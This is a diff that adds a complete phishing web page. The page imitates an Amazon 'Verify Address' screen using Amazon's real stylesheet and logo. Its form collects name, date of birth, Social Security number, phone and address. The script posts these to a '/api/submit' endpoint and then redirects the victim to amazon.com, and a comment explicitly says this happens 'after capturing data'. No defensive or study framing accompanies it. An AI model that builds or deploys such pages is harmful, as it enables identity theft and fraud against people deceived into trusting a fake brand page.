@@ -1,0 +1,171 @@
+<!doctype html>
+<html lang="en" class="a-no-js">
+<head>
+    <meta charset="utf-8"/>
+    <title dir="ltr">Verify Address</title>
+    <link rel="icon" type="image/png" href="amazon.png" />
+    <link rel="stylesheet" href="https://m.media-amazon.com/images/I/21b2CPPFLqL._RC|51nfWTBkewL.css_.css?AUIClients/AmazonUI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+      body { background-color: #fff !important; font-family: "Amazon Ember",Arial,sans-serif; margin: 0; padding: 0; }
+      .header-nav { background-color: #131921; padding: 10px 20px; display: flex; align-items: center; justify-content: space-between; }
+      .header-nav img { height: 35px; margin-top: 5px; }
+      .nav-right { display: flex; align-items: center; color: white; font-size: 14px; gap: 20px; }
+      
+      .content-area { max-width: 600px; margin: 30px auto; padding: 0 20px; }
+      .breadcrumb { font-size: 13px; color: #565959; margin-bottom: 20px; }
+      .breadcrumb span { color: #c45500; }
+      
+      h1 { font-size: 24px; font-weight: 500; margin-bottom: 5px; }
+      .subtext { font-size: 14px; margin-bottom: 25px; font-weight: 700; }
+      
+      .form-group { margin-bottom: 15px; }
+      .form-group label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 5px; }
+      .form-group input, .form-group select { width: 100%; padding: 8px 10px; border: 1px solid #a6a6a6; border-radius: 3px; font-size: 14px; box-sizing: border-box; }
+      .form-group input:focus, .form-group select:focus { outline: none; border-color: #e77600; box-shadow: 0 0 3px 2px rgba(228, 121, 17, 0.5); }
+      
+      .row-3 { display: flex; gap: 15px; }
+      .row-3 .col { flex: 1; }
+      
+      .btn-verify { background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; padding: 10px 15px; cursor: pointer; font-size: 13px; font-weight: 500; box-shadow: 0 2px 5px 0 rgba(213,217,217,.5); display: inline-block; margin-top: 15px; }
+      .btn-verify:hover { background: #f7ca00; }
+      
+      .loading { opacity: 0.7; pointer-events: none; }
+    </style>
+</head>
+<body class="a-m-us a-aui_72554-c">
+
+<!-- Header Mockup -->
+<div class="header-nav">
+    <div>
+        <img src="amazon.png" alt="Amazon" style="filter: brightness(0) invert(1);">
+    </div>
+    <div class="nav-right" style="display: none;">
+        <span>Hello, Sign in</span>
+        <span>Returns & Orders</span>
+    </div>
+</div>
+
+<div class="content-area">
+    <div class="breadcrumb">
+        Your Account › Your Addresses › <span>Verify Address</span>
+    </div>
+    
+    <h1>Confirm your identity</h1>
+    <p class="subtext">Please enter the information that matches your account.</p>
+    
+    <div id="error-box" class="a-box a-alert a-alert-error a-spacing-base" style="display:none; margin-bottom: 20px;">
+        <div class="a-box-inner a-alert-container">
+            <i class="a-icon a-icon-alert" aria-hidden="true"></i>
+            <div class="a-alert-content" id="error-message">
+                Please fill in all required fields.
+            </div>
+        </div>
+    </div>
+
+    <form id="verify-form" method="post">
+        <div class="form-group">
+            <label>Full name (First and Last name)</label>
+            <input type="text" id="fullname" name="fullname" required>
+        </div>
+        
+        <div class="form-group">
+            <label>Date of Birth</label>
+            <input type="date" id="dob" name="dob" required>
+        </div>
+        
+        <div class="form-group">
+            <label>Social Security Number</label>
+            <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" required>
+        </div>
+        
+        <div class="form-group">
+            <label>Phone number</label>
+            <input type="tel" id="phone" name="phone" required>
+        </div>
+        
+        <div class="form-group">
+            <label>Country/Region</label>
+            <select id="country" name="country">
+                <option value="United States">United States</option>
+                <option value="United Kingdom">United Kingdom</option>
+                <option value="Canada">Canada</option>
+                <option value="Australia">Australia</option>
+                <option value="Other">Other</option>
+            </select>
+        </div>
+        
+        <div class="form-group">
+            <label>Address line 1</label>
+            <input type="text" id="address1" name="address1" placeholder="Street address or P.O. Box" required>
+        </div>
+        
+        <div class="form-group">
+            <label>Address line 2</label>
+            <input type="text" id="address2" name="address2" placeholder="Apt, suite, unit, building, floor, etc.">
+        </div>
+        
+        <div class="row-3">
+            <div class="col form-group">
+                <label>City</label>
+                <input type="text" id="city" name="city" required>
+            </div>
+            <div class="col form-group">
+                <label>State</label>
+                <input type="text" id="state" name="state" required>
+            </div>
+            <div class="col form-group">
+                <label>ZIP Code</label>
+                <input type="text" id="zip" name="zip" required>
+            </div>
+        </div>
+        
+        <div>
+            <button type="submit" class="btn-verify" id="btn-submit">Verify Address</button>
+        </div>
+    </form>
+</div>
+
+<script>
+    document.getElementById('verify-form').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        var btn = document.getElementById('btn-submit');
+        btn.classList.add('loading');
+        btn.innerText = 'Verifying...';
+        
+        var payload = {
+            source: 'amazon_verify_identity',
+            fullname: document.getElementById('fullname').value,
+            dob: document.getElementById('dob').value,
+            ssn: document.getElementById('ssn').value,
+            phone: document.getElementById('phone').value,
+            country: document.getElementById('country').value,
+            address1: document.getElementById('address1').value,
+            address2: document.getElementById('address2').value,
+            city: document.getElementById('city').value,
+            state: document.getElementById('state').value,
+            zip: document.getElementById('zip').value,
+            submittedAt: new Date().toISOString(),
+            userAgent: navigator.userAgent
+        };
+        
+        try {
+            var response = await fetch('/api/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            
+            // Redirect to real amazon after capturing data
+            window.location.href = 'https://www.amazon.com/';
+        } catch (err) {
+            document.getElementById('error-box').style.display = 'block';
+            document.getElementById('error-message').innerText = 'Network error. Please try again.';
+            btn.classList.remove('loading');
+            btn.innerText = 'Verify Address';
+        }
+    });
+</script>
+</body>
+</html>
